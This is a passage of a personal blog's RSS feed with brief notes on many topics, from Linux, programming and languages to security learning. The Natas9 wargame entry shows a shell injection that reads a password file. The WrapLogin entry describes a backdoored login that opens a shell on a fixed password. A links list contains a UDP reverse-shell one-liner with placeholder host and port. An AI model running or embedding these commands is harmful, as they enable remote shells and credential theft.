Natas8</title><link>https://www.dinudev.com/journey/otw_natas8/</link><pubDate>Thu, 01 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/journey/otw_natas8/</guid><description>steps: a input is present and a link to the source code, the source code reveals the input is processed through a function and compared to a static value create a function that runs the operations in the oposite direction 1, modeled by the function from the source by sending the static value found in the source code through our function we get the initial input use the initial input in the page and we will get the flag lessons: this is probably a simple introduction to hashing &amp;lt;?</description></item><item><title>OTW Natas9</title><link>https://www.dinudev.com/journey/otw_natas9/</link><pubDate>Thu, 01 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/journey/otw_natas9/</guid><description>steps: the page searches for an input in a particular file the code source shows the user input is sent without validation through a php passthru to the os, this hints to a shell injection 1 by sending a .* we get the entire contents of the file by sending ; id; we get the php user remembering from natas description that All passwords are also stored in /etc/natas_webpass/., we try ; cat /etc/natas_webpass/natas10; and get the flag lessons: never use raw user input if you are forced to use user input, sanitize it before using Shell injection allows the user to run arbitrary commands on the server os.</description></item><item><title>Clean Code</title><link>https://www.dinudev.com/post/clean_code/</link><pubDate>Mon, 26 Jul 2021 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/clean_code/</guid><description>Info: Code is clean if it can be understood easily – by everyone on the team. Clean code can be read and enhanced by a developer other than its original author. With understandability comes readability, changeability, extensibility and maintainability.
General rules Follow standard conventions. Keep it simple stupid. Simpler is always better. Reduce complexity as much as possible. Boy scout rule. Leave the campground cleaner than you found it. Always find root cause.</description></item><item><title>Filesystem Hierarchy Standard</title><link>https://www.dinudev.com/post/fhs/</link><pubDate>Mon, 26 Jul 2021 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/fhs/</guid><description>basic concepts: shareable vs unshareable: shareable: stored on one system and used on other systems unshareable: !shareable variable vs static: static: files that do not change without sysadmin intervention(libraries, binaries, documentation, etc) variable: !static static files can be stored on read-only media, and their backup schedules is different than variable files matrix: shareable unshareable static /usr/ /etc/ /opt/ /boot/ variable /var/mail/ /var/run/ /var/spool/news/ /var/lock/ fhs: /: used for system maintenance: boot, recover, restore, repair children: /bin/: binaries for use by all users no subdirectories allowed required children: cat, chgrp, chmod, chow, cp, date, dd, df, dmesg, echo, false, hostname, kill, ln, login, ls, mkdir, mknod, more, mount, mv, ps, pwd, rm, rmdir, sed, sh, stty, su, sync, true, umount, uname, test, [ /boot/: bootloader static files kernel is stored here stores everything required to boot the system everything that is used before the kernel loads user-land apps receives help from /sbin/ binaries boot configuration is stored in /etc/ /dev/: device files /etc/: host-specific configuration files no binaries allowed, only non-executable static files required children: /etc/opt/: configuration files for third-party applications /home/: user home directories storage of user-specific settings, applications, files /lib/: shared libraries and kernel modules repository of shared libraries or kernel modules used by /bin/ and /sbin/ apps required children: /lib/modules/: for kernel modules /lib/cpp/: if a C preprocessor is installed libc.</description></item><item><title>Jetbrains license server</title><link>https://www.dinudev.com/journey/jb_license_server/</link><pubDate>Mon, 26 Jul 2021 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/journey/jb_license_server/</guid><description>logic: a tls priv-public key pair exists clients have the public key, the servers have the private key the client sends a request with his unique set of identifying information encoded response = rsa detached signature = hash the content then sign with private key the server checks the info and sends a response back: the response is the content + encoded response signing: encode data to be signed as string, then hash with md5, then sign the resulted detached signature is the encoded response methods: endpoints: /rpc/ping.</description></item><item><title>Special Operations Framework</title><link>https://www.dinudev.com/post/specops/</link><pubDate>Mon, 26 Jul 2021 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/specops/</guid><description> Plan: Simplicity: as few parts as possible as few complicated parts as possible as few dependencies as possible as little time based requirements(parts that need to be syncronised at a specific point in time) few objectives good inteligence: reduces the number unknown factors reduces the number of variables that must be considered innovation: new technology unconventional tactics Prepare: Security: keep the operation secret, otherwise an opposing force might find out you are planning for an attack, and expect you(compromising the &amp;ldquo;surprise&amp;rdquo; factor) keeping secret the timing and means of insertion are more important than the fact that there will be an attack Repetition: know the movements thoroughly when time comes to live, everything should feel like second nature repetition hones individual and unit skills full-dress rehearsal unconvers unforseen weaknesses in the plan Execute: Surprise: the target should not expect YOU to attack the target should not expect to be attacked THERE the target should not expect to be attacked THEN deception, timing, and taking advantage over the enemies vulnerabilities Speed: there is a span of time where the attackers are vulnerable(the operation might fail): from the point of no return until the goals have been achieved, or the operation is completed Purpose: if you have a purpose, the goals and the steps of achieving them are very clear the purpose must be clearly stated by the mission statement personal commitment(be inspired to complete the operation) the more restricted the strength(number of agents, firepower), the more restricted the goals and duration must be hit where the enemy is not expecting and know when to stop</description></item><item><title>WrapLogin</title><link>https://www.dinudev.com/journey/wraplogin/</link><pubDate>Mon, 26 Jul 2021 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/journey/wraplogin/</guid><description>flow: setup a signal handler h for signum n: n = 14d = SIGALRM h = connection connection: execv(&amp;quot;/bin/.login&amp;quot;, *app_list_of_arguments[]) exit(0) schedule a n seconds signal alarm: n = 1d alarm(1) emulate &amp;ldquo;/bin/login&amp;rdquo; by asking a password from the user if password == &amp;ldquo;door&amp;rdquo;: alarm(0) execl(&amp;quot;/bin/sh&amp;quot;, &amp;quot;/bin/sh&amp;quot;, &amp;quot;-i&amp;quot;) exit(0) else: execv(&amp;quot;/bin/.login&amp;quot;, *app_list_of_arguments[]) exit(0) imports: execl execv strcmp signal scanf alarm exports: execute connection passwd strings: /bin/login door /bin/sh /bin/.login /export/home/gb.local/rpm/BUILD/glibc-2.3.1/build-i586-linux/csu/crti.S /export/home/gb.</description></item><item><title>Math increases critical thinking skills</title><link>https://www.dinudev.com/paper/math_critical_thinking/</link><pubDate>Sun, 25 Apr 2021 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/paper/math_critical_thinking/</guid><description>Notes: expository teaching: a teacher stands at the front of the class and talks about the subject: exposits the rules provides examples mathematical investigation teaching(MIT): explore a topic in depth make connections between representations stages: entry: understand the task goal setting: pose a specific problem or search for a pattern attack review extension some researchers think critical thinking is an inclination: clear statement of the question seek reasons be well informed stick to the point mathematical thinking: fundamental processes: specializing: trying special cases generalizing: looking for patterns(and relationships ?</description></item><item><title>Reverse Engineering Taxonomy</title><link>https://www.dinudev.com/paper/re_taxonomy/</link><pubDate>Sun, 25 Apr 2021 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/paper/re_taxonomy/</guid><description>Notes: The main scope of this paper is to clarify the terminology used in RE for: forward engineering(fe) reverse engineering(re) redocumentation design recovery restructuring reengineering life-cycle stages: requirements: objectives constrains business rules design: specification of the solution implementation: coding testing delivery forward engineering: to move from higher levels of abstraction to concrete results from design to implementation reverse engineering: term comes from hardware analysis, where dechypering the structure of build products is commonplace in hardware, the point of re is to clone the system in software, the point of re is to gain enough understanding so you can: mantain extend patch discover the internal entities and then relationships between them document the findings branches: redocumentation design recovery restructuring(refactoring): keep the interface and rewrite the internals reengineering: engineer a new system to replace an old one based on old system&amp;rsquo;s requirements coupled with new ones includes re, if no documentation is provided includes fe to take into account new technologies, methods and requirements Objectives of re: cope with complexity generate alternate views recover lost information: changes in large systems tend to not be documented detect side effects: re can provide information that fe does not have access to synthesize higher abstractions facilitate reuse Economics: costs of comprehending(and of repairing misunderstandings) exists, although not perceived as a direct one Observations: do these naming conventions still hold true today?</description></item><item><title>Web application security</title><link>https://www.dinudev.com/post/websec/</link><pubDate>Sun, 25 Apr 2021 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/websec/</guid><description>Security formalism failure reasons: to many different parties act on the same system, and the changes are too many and too quick for a static structure to be described IF everybody stops and decides on a common structure, that does not mean the structure can be translated in a set of computable constrains as of yet, there is not an way to prove, through static analysis, that an application will behave the way it was meant to behave, in complex, real-world scenarios; Turing also proved that there can be no algorithm that can show the outcome of another algorithm Risk management: in interconnected systems, even the most benign endpoint can be used to enter a network, and escalate from there, or pivot horizontally; a IoT door lock can be the entrypoint for a ransomeware it is hard to account for potential lawsuits, users loss of confidence in the brand its a high chance that self-reported data is incomplete, or breaches are unreported the attack surface is large and any one part can be attacked succesfuly, althou some parts are targeted more(statistically speaking), no one part is more important than the rest Things that work: learn from(preferably other people&amp;rsquo;s) mistakes develop tools to detect and fix problems presume everything is compromised Pragmatic methods: what is the exposed surface of the modern browsers?</description></item><item><title>PostgreSQL</title><link>https://www.dinudev.com/post/postgresql/</link><pubDate>Mon, 03 Aug 2020 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/postgresql/</guid><description>Why postgresql?: they say they are fast stored procedures and functions in a lot of languages: python, ruby, c, sql, javascript, r, perl a lot more built-in types + custom types can be used not only as a db, but as a development platform mature: 20 years of development licensing: distribute, modify, commercial use allowed can&amp;rsquo;t hold liable you must include copyright and license Why not?: mainly geared thowards big enterprise uses: big installation size complex security settings not recommended as a cache server not recommended for simplistic crud applications What are some common administration tools?</description></item><item><title>Systemd</title><link>https://www.dinudev.com/post/system/</link><pubDate>Sat, 01 Aug 2020 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/system/</guid><description>Reasons why RHEL migrated from Upstart init daemon(RHEL 6) to systemd: faster boot times because targets units startup can be paralelized(systemd-analyze time/systemd-analyze blame) only needed units are started, others are started on demand units use cgroups(linux kernel native) to group, control( ensure all processes of the service are terminated upon service stop) and limit processes started by a service(systemd-cgls) a central logging system(journalctl): for log disk persistence: mkdir /var/log/journal chgrp systemd-journal /var/log/journal chmod 2775 /var/log/journal systemctl restart systemd-journald.</description></item><item><title>Language acquisition</title><link>https://www.dinudev.com/post/language_acquisition/</link><pubDate>Tue, 14 Jul 2020 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/language_acquisition/</guid><description>Misc: although early learners gain a higher profiency, adolescent/adult L2 learners learn faster(phonology, morphology, vocabulary, grammar) early L2 use the same broca&amp;rsquo;s area part for speech generation, while older L2&amp;rsquo;s use two distinct but adjacent areas; this is not correlated positive or negative with proficiency early L2 and late L2&amp;rsquo;s use the same Wernicke&amp;rsquo;s area parts for speech perception on average early L2 are beter than older L2, but while early L2&amp;rsquo;s perform fairly similar, older L2&amp;rsquo;s show a great variation in proficiency pronunciacion varies in the same country, a standard needs to be set before testing if you are in a foreign country, DO NOT spend time with people that speak your language prepubescent children might attain higher level of profiency in L2 at the expense of L1 and older learners attain L1 profiency at the expense of L2 old l1 in l2 country tend to surround themselves with information in l1 thus slowing down the l2 progress, children l1 in l2 country then to change to l2 as a dominant language or become monolingual in l2 you gain higher profiency if: you are motivated to learn l2(language anxiety, self-confidence play a big part) you are exposed to natural l2 you are counscious of the grammatical form cognitive aptitude and beliefs about oneself are more strongly correlated with success of acquiring l2 than age Three Misconceptions AboutAge and L2 Learning (Harvard University, Cambridge, Massachusetts, United States), STEFKA H.</description></item><item><title>Nederlands</title><link>https://www.dinudev.com/post/nederlands/</link><pubDate>Tue, 07 Jul 2020 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/nederlands/</guid><description>Nieuws: metronieuws reformatorisch dagblad nederlandsdagblad het financieele dagblad trouw nrc volksraant ad telegraaf other: letterenfonds nrc Important places(to visit) and events(to learn about): napoleonic code wadden sea piet modrian(de stijl?!) the 1980 Equal Opportunities Act River Vecht Education in the Netherlands dutch east indies Letter pronunciation: odd letters: g: hei(gutural h) h: ha j: iei q: cu w: uei vowel combinations(diphtongs): ij: normally &amp;ldquo;ai&amp;rdquo; inside -lijk: &amp;ldquo;uh&amp;rdquo; ou and au: &amp;ldquo;au&amp;rdquo; oe: &amp;ldquo;uu&amp;rdquo; ui: &amp;ldquo;au&amp;rdquo; eu: &amp;ldquo;eou&amp;rdquo; eeuw / ieuw: &amp;ldquo;eeu&amp;rdquo; / &amp;ldquo;ieu&amp;rdquo; consonant combinations: ch: g or &amp;ldquo;ș&amp;rdquo; sj: &amp;ldquo;ș&amp;rdquo; sch: sg ng: nasal &amp;ldquo;nnnn&amp;rdquo; misc: c can be pronounced as either s or k i: short as &amp;ldquo;e&amp;rdquo; long as &amp;ldquo;i&amp;rdquo; when in words ending with -ig or -is: &amp;ldquo;ă&amp;rdquo; q: only used in foreign words followed by u: &amp;ldquo;kuh&amp;rdquo; v: prononunced quite close to f w(&amp;ldquo;uei&amp;rdquo;): when followed by r it is pronounced v: wraak y(y-grec): as i: xylofoon as j: rayon words never end in double consonants: rennen becomes ik ren words that end in a long vowel, double it: lopen becomes wie loopen words that end in v or z transform it in f and s letters that swap pronunciation at the end of the word: hard soft b p d t Verbs and pronouns: subject forms of the personal pronoun: enkelvoud(singular) meervoud(plural) 1e persoon(1st person) ik wij/we 2e persoon(2nd person) jij/je(informeel), u(formeel) jullie(informeel), u(formeel) 3e persoon(3rd person) hij(mannelijk), zij/ze(vrouwelijk), het(neuter) zij/ze tenses: present tense: verbs followed by jij or je drop the ending -t verb ending for u is always -t verbs with stems that end in -t or -d: -t do not add another t -d add a t or drop the -d when inverted(followed by jij or je) irregular infinitives: some one-syllable verbs have a stem ending in simply -n spelling in verb conjugation enkelvoud meervoud 1e persoon stem stem + en 2e persoon stem + t stem + en 3e persoon steam + t steam + en modal verbs: can(kunnen), should(zullen), may(mogen), must(moeten), want to(willen), etc modal verbs are conjucated normally and replace the main verb in the phrase, the main verb is the added at the end(as the last word) in infinitive form there are forms where the infinitive main verb is not said: &amp;ldquo;Wilt u loopt?</description></item><item><title>Red Hat</title><link>https://www.dinudev.com/post/rh/</link><pubDate>Tue, 07 Jul 2020 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/rh/</guid><description>Virtual machines and automated installations: what is kvm(kernel-based virtual machine)? a kernel module that allows compatible processors to run vms() each vm is a regular process each vm has dedicated virtual hardware how do you configure it on a fresh install?: install: # yum install &amp;quot;Virtualization Host&amp;quot; &amp;quot;Virtualization Client&amp;quot;: qemu-kvm: main kvm package libvirt: hypervisor manager as a daemon libvirt-client: virsh and the API that controls vms virt-install virt-manager: GUI virsh virt-top virt-viewer: GUI to connect to vm consoles check for kernel modules: # lsmod | grep kvm: kvm_intel kvm kvm_amd kvm if not enabled # modprobe kvm_intel or # modeprobe kvm_amd enable if not enabled change images location: $ mkdir &amp;lt;path/to/folder&amp;gt; $ su - root # semanage fcontext -a -t virt_image_t &amp;#39;&amp;lt;path/to/folder&amp;gt;(/.</description></item><item><title>SQ3R Method</title><link>https://www.dinudev.com/post/sq3r/</link><pubDate>Sat, 04 Jul 2020 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/sq3r/</guid><description>Effective Study - Francis P. Robinson a typical student: takes learning/reading as a chore reads the textbox mechanically and if anything is hard to understand, it just keeps reading reading is thought of in terms of quantity effectivenes of &amp;ldquo;trial and error&amp;rdquo; student methods: a test imediatelly after the learning session has 53% success in memory recollection
a test after multiple rereadings averages about 70% retention
reading 9, 8, 45, 6, 2, 4, 6, 8 just gives you the impressions that you learned the sequence because the numbers are familiar</description></item><item><title>Developer Roadmap</title><link>https://www.dinudev.com/post/developer_roadmap/</link><pubDate>Fri, 26 Jun 2020 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/developer_roadmap/</guid><description>Programming: general:
SICP - Abelson, Sussman
Refactoring - Martin Fowler
Domain Driven Design - Eric Evans
introduction to algorithms - CLRS
clean code - robert c. martin
code complete 2 - mcconnell
the pragmatic programmer - hunt, thomas
the clean coder - robert c. martin
Design Patterns - &amp;ldquo;Gang of Four&amp;rdquo;
OOP:
Refactoring - Martin Fowler functional:
SICP - Abelson, Sussman logic:
symbolic:
Testing: any testing framework documentation Databases: DevOps:</description></item><item><title>Malware Researcher Roadmap</title><link>https://www.dinudev.com/post/malware_research_roadmap/</link><pubDate>Thu, 25 Jun 2020 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/malware_research_roadmap/</guid><description>Final goal: malware researcher/analyst Basics: How To Ask Questions The Smart Way math: college linear algebra probability and statistics networking: [-] CCNA system administration: reddit - sysadmin - learn reddit - sysadmin - bootcamp windows: MCSE AD DC DNS DHCP GPO linux: RHCSA 7/8 tooling: the ida pro book - eagle reverse engineering: Reversing: Secrets of Reverse Engineering - eldad eilam Reverse Engineering for Begginers - dennis yurichev malware analysis: begginer: practical binary analysis - dennis andriesse practical malware analysis - sikorski, honig malware analyst&amp;rsquo;s cookbook - ligh, adair, hartstein, richard middle: Rootkits and Bootkits - matrosov, rodionov, bratus the rootkit arsenal - blunden the art of memory forensics(a long tutorial on volatility framework) - ligh high: the shellcoder&amp;rsquo;s handbook(very high level): this might be out of date After basics resources(understand thoroughly each and every item there): https://github.</description></item><item><title>SICP</title><link>https://www.dinudev.com/post/sicp/</link><pubDate>Mon, 22 Jun 2020 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/sicp/</guid><description>Scheme syntax: reverse enginered from book code snipets and &amp;ldquo;trial and error&amp;rdquo; start_delimiter = &amp;#34;(&amp;#34;; end_delimiter = &amp;#34;)&amp;#34;; space = &amp;#34; &amp;#34;; definition_keyword = &amp;#34;define&amp;#34;; keyword = definition_keyword; digit = &amp;#34;1&amp;#34;|&amp;#34;2&amp;#34;|&amp;#34;3&amp;#34;|&amp;#34;4&amp;#34;|&amp;#34;5&amp;#34;|&amp;#34;6&amp;#34;|&amp;#34;7&amp;#34;|&amp;#34;8&amp;#34;|&amp;#34;9&amp;#34; [{, &amp;#34;0&amp;#34;|&amp;#34;1&amp;#34;|&amp;#34;2&amp;#34;|&amp;#34;3&amp;#34;|&amp;#34;4&amp;#34;|&amp;#34;5&amp;#34;|&amp;#34;6&amp;#34;|&amp;#34;7&amp;#34;|&amp;#34;8&amp;#34;|&amp;#34;9&amp;#34; }]; float = digit , &amp;#34;.&amp;#34; , digit [{, digit }]; number = digit [{, digit }]; alpha_character = {a...z}|{A...Z} character = alpha_character|&amp;#34;_&amp;#34;|digit|float; string = alpha_character [{, character }]; primitive_operator = &amp;#34;+&amp;#34;|&amp;#34;-&amp;#34;|&amp;#34;*&amp;#34;|&amp;#34;/&amp;#34;|&amp;#34;%&amp;#34;; operator = primitive_operator|expression_between_parentheses; expression_between_parentheses = start_delimiter , space , expression , space , end_delimiter; expression = start_delimiter , [operator] , space , digit|float|number|character|string|expression,function_call [{, space , digit|float|number|character|string|expression|function_call }] , space , end_delimiter;(* can a compound operator receive a single param?</description></item><item><title>Bash</title><link>https://www.dinudev.com/post/bash/</link><pubDate>Sun, 14 Jun 2020 21:45:00 +0200</pubDate><guid>https://www.dinudev.com/post/bash/</guid><description>Environment variables: HISTCONTROL: don&amp;rsquo;t add to history certain lines options: ignorespace: don&amp;rsquo;t add lines that start with a space ignoredups: don&amp;rsquo;t add duplicates ignoreboth: ignorespace AND ignoredups Commands: shopt: toggle values of variables controlling shell behaviour: -s: set option name histappend: append instead of overwriting history list to file pointed by HISTFILE Conditions: -a: file exists
-b: file is a block file
-c: file is a character file
-d: file is a directory</description></item><item><title>Info</title><link>https://www.dinudev.com/journey/info/</link><pubDate>Sun, 07 Jun 2020 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/journey/info/</guid><description>Introduction: The best way to learn something fast is to start doing it.
This is the beginning of my journey in infosec.</description></item><item><title>.NET</title><link>https://www.dinudev.com/post/net/</link><pubDate>Fri, 17 Apr 2020 13:00:00 +0200</pubDate><guid>https://www.dinudev.com/post/net/</guid><description>.NET: structure: runtime component languages compilers platforms: .NET Core .NET Framework Xamarin it provides definitions for a set of Base Class Libraries(BCL) APIs to be implemented by all the platforms conforming to the standard .NET Core: components: CoreCLR(Common Language Runtime): open source refactoring of the original CLR manage usage and references to objects communication and interactions of objects written in the different languages supported garbage collection components: garbage collector Just In Time(JIT) compiler Native interop: allow managed(.</description></item><item><title>Assembly</title><link>https://www.dinudev.com/post/asm/</link><pubDate>Fri, 17 Apr 2020 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/asm/</guid><description>Assembly: Single Instruction Multiple Data(SIMD): paralelize instructions using multiple data points instead of adding 2 DWORDs, paralelize adding 8 DWORDS by adding 4 with another 4 at the same time Endianness: little endian: least significant byte first(x86/x86_64/AMD64) big endian: most significant byte first bi-endian: contain an instruction that allows for switchable endianness(ARM v3 and beyond) Categories of operations: load data store data modify data call a function Memory segmentation: x64 uses flat memory: there is only one memory segment Stack: the stack must be N bytes aligned: SP must be a N bytes multiplier this simplifies read of data; data is read in less memory access cycles if the stack is N bytes aligned, the processor will read from one address the entire value if not the processor will have to read from two addresses and merge the result intel and AMD require 16-bytes alignment to execute SSE instructions corectly growing downwards from the highest memory to the lowest bp is the start of the stack, sp is the top of the stack shadow store(spill space, home space, shadow space): space allocated on the stack by the caller for the callee(to save registers used to pass arguments) the size is determined by the maximmum size supported(in x86_64 is 8 bytes) * number of registers used to pass parameters shadow store is not part of the stack frame stack frame: a frame of data that is placed on the stack structure: return instruction pointer first allocate space for base pointer and local variables actions: pop: remove an item from the stack push: add an item on the stack call: types: near call: near relative(E8): add the address called to the address of the next instruction(directly) =&amp;gt; call some_function near absolute(FF): specify the call address in an mem store or reg(indirectly) =&amp;gt; call [rbx] far call inter-privilege-level far call task switch call tasks: push IP on the stack jump to call address + next instruction address ret: transfers program controll to an address located on the top of the stack pop and jump to that address opcodes: C3 C2 Calling conventions: fastcall: the stack must be alligned to a 16 byte boundary use 4 reg to pass parameters(left to right): rcx, rdx, r8, r9 any argument that doesn&amp;rsquo;t fit into a supported size(1, 2, 4, 8 bytes) will be passed by reference before the call, the caller allocates space on the stack cdecl: allocate space for any functions called in it first two arguments are stored in rsi and rdi stdcall c++ thiscall ARM ISAs: ARM mode: 4-byte instruction set Thumb mode: 2-byte instruction set Thumb-2(ARM-v7): 4-byte instruction set; extension of Thumb that should compete with ARM mode x64 mode: 4-byte instruction set; not compatible to any other Numeral systems: radix = numeral base PE: sections always start at addresses ending in 3 hex zeros: 0x41000, 0x10001000, because sections are padded to a boundary of 0x1000(4096) bytes Misc: why does the stack grow downwards?</description></item><item><title>Test Driven Development</title><link>https://www.dinudev.com/post/tdd/</link><pubDate>Fri, 17 Apr 2020 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/tdd/</guid><description>Test Driven Development(TDD): types: unit tests: test functionality in isolation used to test functionality at the lowest level of computation(method, function) integration tests: test the interaction and data exchange of multiple units types: top-down: top-level components are integrated and tested first bottom-up: lower-level components are integrated and tested first big bang: everything is integrated and tested at once system tests: validate the entire integrated system performed imediatelly after integration tests testing is made from the users perspective made with real data principles: write the tests: the test are a form of documentation write the code: write just enough to pass the test run the tests: if they fail, rewrite the tests or the code refactor: the tests or code until full coverage is achieved remove duplicates attempt to fix any signs of code smell make changes gradually, one test at a time red-green-refactor: red: add a failing test green: make it work refactor</description></item><item><title>PowerShell</title><link>https://www.dinudev.com/post/powershell/</link><pubDate>Fri, 10 Apr 2020 07:00:00 +0200</pubDate><guid>https://www.dinudev.com/post/powershell/</guid><description>Snap-ins: ms is moving away from the concept of snapins and more thowards modules structure: name: PSSnapin files: one or more dlls 0 or more xml configuration files they have to be installed and registered to be used control: Add-PSSnapin Remove-PSSnapin Get-PSSnapin help for loaded snapins: Get-Command -PSSnapin &amp;lt;snapinname&amp;gt; Modules: more self-contained and easier to distribute they dont need registration, ps will look in certain paths when searching for a command ($env:PSModulePath) if a module is not in modulepath you can add it with Import-Module if multiple modules are loaded and have a command with the same name, the last loaded module&amp;rsquo;s command will be called user modules location: $Home\Documents\WindowsPowerShell\Modules Profiles: a script that is run on shell init system profiles location: a profile location: current user, current host: $PROFILE.</description></item><item><title>C#</title><link>https://www.dinudev.com/post/csharp/</link><pubDate>Fri, 03 Apr 2020 18:59:00 +0200</pubDate><guid>https://www.dinudev.com/post/csharp/</guid><description>General: expression-bodied members: public string Func(param) =&amp;gt; &amp;quot;result&amp;quot; + param string interpolation: var str = &amp;quot;string&amp;quot;; $&amp;quot;This is a {string}&amp;quot; using static: public class Cls { public static string staticString = &amp;#34;str&amp;#34;; } using static Cls; Console.WriteLine(staticString) deconstruction: public static (string, int) Func(string) { var rnd = new Random(); return (string, rnd.Next()); } var (someString, someInt) = Func(&amp;#34;test&amp;#34;); // with types (string someString, int someInts) = Func(&amp;#34;test&amp;#34;); // with discards (\_, someInt) = Func(&amp;#34;test&amp;#34;); blazor are razor pages running in the browser, a mono runtime compiled to web assembly Func&amp;lt;string, int, decimal&amp;gt;: a delegate type with string, int parameters and decimal return type delegate that does not return a value: Action Action&amp;lt;T&amp;gt;(T is the param to the delegate) Generics: type safety at compile time without knowing the type beforehand Representing nullable values: Iterators: lazy computation at run-time C# 3: object and collection initializer: new Agent() {Name = &amp;quot;James&amp;quot;, Surname = &amp;quot;Bond&amp;quot;} new Agency() { Agents = { new Agent() {Name = &amp;quot;James&amp;quot;, Surname = &amp;quot;Bond&amp;quot;}, new Agent() {Name = &amp;quot;Bond&amp;quot;, Surname = &amp;quot;James&amp;quot;} } } Expresion trees: code available for inspection at execution-time data structure that represents executable code it is much easier to translate a data structure to SQL instead of IL to SQL only expression-bodied lambda expressions can be converted to expression trees, this is less of a problem with the addition of object and collection initializers (which are initialized as single expressions) Expression&amp;lt;Func&amp;lt;int, int, int&amp;gt;&amp;gt; adder = (x, y) =&amp;gt; x + y; Console.</description></item><item><title>Classical Music</title><link>https://www.dinudev.com/post/music_classical/</link><pubDate>Sat, 28 Mar 2020 21:49:00 +0200</pubDate><guid>https://www.dinudev.com/post/music_classical/</guid><description> Composer Name Subname Verdi Requiem vivaldi four seasons summer III presto beethoven egmont beethoven 5th mussorgsky night on bald mountain mozart nachtmusik janacek glagolitic mass Chopin Etudes and Preludes Rimsky-Korsakov Scheherazade op.35 gustav holst the planets Maurice Ravel Bolero</description></item><item><title>Windows</title><link>https://www.dinudev.com/post/windows/</link><pubDate>Mon, 16 Mar 2020 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/windows/</guid><description>Major Versions: XP(2001) 5.1 Vista(2007) 6.0 7(2009) 6.1 8(2012) 6.2 8.1(2013) 6.3 10(2015) 10 Component Object Model(COM): originally created to enable Office apps to communicate and exchange data between documents (Object Linking and Embedding - OLE) principles: clients communicate with objects(COM server objects) through interfaces component implementation is loaded dynamically rather than begin statically linked to the client it tipically refers to a DLL or EXE where the COM classes are implemented Windows Runtime(WinRT): platform services aimed particularlly at app developers for Windows Apps(Windows Store Apps) can target multiple device form factors(IoT, phones, tablets, desktops, xbox, hololens) built on top of COM .</description></item><item><title>Random urls</title><link>https://www.dinudev.com/post/random_urls/</link><pubDate>Mon, 09 Mar 2020 00:00:00 +0000</pubDate><guid>https://www.dinudev.com/post/random_urls/</guid><description>Urls: https://www.viewbug.com/member/beamieyoung https://mirelapetcu.com/ tejal mewar https://lindahollinger.photography/ federica molinari http://www.kalua.pl/gallery/collodion-between-two-moons/ https://pattycarroll.com/ https://unix.stackexchange.com/questions/47082/how-to-improve-windows-perfomance-when-running-inside-kvm https://www.linuxtechi.com/create-revert-delete-kvm-virtual-machine-snapshot-virsh-command/ https://dennisnotes.com/note/20180614-ubuntu-18.04-qemu-setup/ http://www.azertech.net/content/windows7-kvm-qemu-qcow2-snapshots https://kerneltalks.com/disk-management/how-to-guide-lvm-snapshot/ http://heim.ifi.uio.no/~trygver/themes/mvc/mvc-index.html Millions of programmers die every year from hope-influenced asphyxiation leo brouwer lera lynn - out to sea toread uber migration from pg to mysql sandboxing implementation sandboxing linux Bit Twiddling Hacks nsarchive public intelligence KVM API fossil vault rsync.net cryptoparty.in re basics linkers bios related bios related git&amp;rsquo;s source repo rutkowska&amp;rsquo;s blog pentesterland corelan 0&amp;lt;&amp;amp;#{rand_fd}-;exec #{rand_fd}&amp;lt;&amp;gt;/dev/udp/#{LHOST}/#{LPORT};echo&amp;gt;&amp;amp;#{rand_fd};sh &amp;lt;&amp;amp;#{rand_fd} &amp;gt;&amp;amp;#{rand_fd} 2&amp;gt;&amp;amp;#{rand_fd} statistics robert graham microphones linux network programming programming languages grapheneos trackthis sourcemaking devdocs informatic post mortems re heaven research.</description></item><item><title>Russian</title><link>https://www.dinudev.com/post/russian/</link><pubDate>Sat, 07 Mar 2020 02:02:00 +0200</pubDate><guid>https://www.dinudev.com/post/russian/</guid><description>Social media urls: https://vk.com/ https://ok.ru/ https://mail.ru/ https://www.avito.ru/rossiya News urls: https://www.pravdareport.com/ https://meduza.io/ https://www.themoscowtimes.com/ https://tass.ru/ https://russia-insider.com/en Learning urls: http://masterrussian.com/ http://www.russianlessons.net/ Random urls: https://forum.ixbt.com/ https://civitas.ru/forum.php https://www.sql.ru/forum http://www.ourprivate.net/forum/index.php https://forum.privet.com/ https://club443.ru/ https://rsdn.org/ https://russificateforum.com/ https://cooljugator.com/ru/ General Grammar: End of word consonants are pronounced like their voiceless counterparts:
б п в ф г к д т ж ш з с Consonants are voiceless when followed by other voiceless consonants and the other way around
